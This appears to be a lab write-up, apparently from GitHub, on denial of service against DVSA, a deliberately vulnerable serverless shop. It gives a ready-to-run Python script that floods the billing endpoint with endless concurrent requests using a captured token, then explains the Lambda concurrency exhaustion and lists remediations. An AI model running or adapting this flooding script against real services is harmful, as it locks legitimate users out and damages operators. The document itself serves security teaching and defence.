## 🏗️ Project Overview

The objective of this project is to demonstrate how a lack of rate limiting and improper backend validation can allow an attacker to lock out all users from critical application workflows (like checkout and login).

### 🛠️ Prerequisites
* **Python 3.x:** Installed on your local machine.
* **Requests Library:** Install via `pip install requests`.
* **Burp Suite (Optional):** Helpful for capturing initial session tokens.
* **DVSA Instance:** A running deployment of the vulnerable application.

---

## 🔓 Step-by-Step Reproduction

### 1. Capture Required Session Data
To flood the backend, we first need a legitimate session to "piggyback" on.

1.  Log in to the DVSA application as an attacker.
2.  Add an item to your cart and proceed to the checkout phase to generate a **valid Order ID**.
3.  Open your browser's **DevTools** (Network tab) or use **Burp Suite** to capture the `POST` request to the `/order` endpoint.
4.  Copy the following two values:
    * **Authorization Token (JWT):** Found in the request headers.
    * **Order ID:** Found in the JSON response body.


### 2. Prepare the Exploit Script (`DOS.py`)
We will use a Python script to initiate hundreds of concurrent requests to the billing service. This overwhelms the lambda function's execution limit.

**Create a file named `DOS.py` and paste the following code:**

```python
import threading
import requests
import time

# --- CONFIGURATION ---
TOKEN = "YOUR_CAPTURED_JWT_HERE"
ORDER_ID = "YOUR_CAPTURED_ORDER_ID_HERE"
API_URL = "https://your-api-gateway-id.execute-api.us-east-1.amazonaws.com/dvsa/order"

# Limit local thread concurrency to prevent crashing your own machine
semaphore = threading.Semaphore(50)

def dos_attack():
    with semaphore:
        payload = {
            "action": "billing",
            "order-id": ORDER_ID,
            "data": {
                "ccn": "4242424242424242",
                "exp": "12/2030",
                "cvv": "123"
            }
        }
        headers = {"Authorization": TOKEN}
        
        try:
            # Short timeout to keep the threads cycling rapidly
            response = requests.post(API_URL, json=payload, headers=headers, timeout=5)
            print(f"[*] Status: {response.status_code} | Message: {response.text}")
        except Exception as e:
            print(f"[!] Request failed: {e}")

if __name__ == "__main__":
    print("[+] Starting DoS attack on DVSA backend...")
    while True:
        # Spawn new threads continuously
        t = threading.Thread(target=dos_attack)
        t.start()
        # Small delay to ensure the OS can handle thread creation
        time.sleep(0.05)
```


### 3. Execute the Attack
1.  Open your terminal.
2.  Run the script: `python3 DOS.py`
3.  You will see a flood of `Internal Server Error` messages or successful triggers of the billing logic.

### 4. Verify the Impact (Victim Perspective)
1.  Open a different browser (or an incognito window) and log in as a **different user (the Victim)**.
<img width="1467" height="641" alt="2026-04-17_18-51-44" src="https://github.com/user-attachments/assets/b950f5b8-a3f1-421b-8d5a-37957d9738e5" />

3.  Try to add an item to the cart and click **"Check Out"**. 
<img width="1460" height="658" alt="2026-04-17_18-52-38" src="https://github.com/user-attachments/assets/67fcc22a-8cca-419d-848b-1fa3e4d50169" />

5.  **Observation:** The application will hang indefinitely on a loading spinner, or you will receive an error pop-up:
    > *"[ERROR] DVSA backend does not work properly. Try to delete cache and re-login."*


---

## 🧠 Vulnerability Analysis

### Why does this work?
1.  **Lambda Concurrency Limits:** AWS Lambda has a default limit on concurrent executions. By flooding the `billing` action, the attacker consumes all available execution slots, leaving none for legitimate users trying to log in or browse.
2.  **Missing Rate Limiting:** The API Gateway does not have a "Usage Plan" or "Throttling" configured to limit the number of requests a single user can make per second.
3.  **Expensive Operations:** The billing process might involve external API calls or database writes, making it a "heavy" function that stays active longer, exacerbating the concurrency exhaustion.

---

## 🛡️ Remediation Strategies

To secure the application against this architectural flaw, implement the following:

* **API Gateway Throttling:** Enable rate limiting at the API Gateway level. Set a reasonable "Requests per Second" (RPS) limit per API key or IP address.
* **Reserve Concurrency:** Assign a "Reserved Concurrency" limit to critical functions (like Login) to ensure they always have dedicated resources, even if another part of the app is under attack.
* **Asynchronous Processing:** Move heavy tasks like billing to an asynchronous queue (e.g., AWS SQS). This allows the Lambda to finish quickly and return a "Processing" status to the user, freeing up concurrency slots.
* **Request Validation:** Ensure the backend validates the `order-id` status. If an order is already being processed, the function should return an error immediately rather than re-initiating the expensive billing logic.
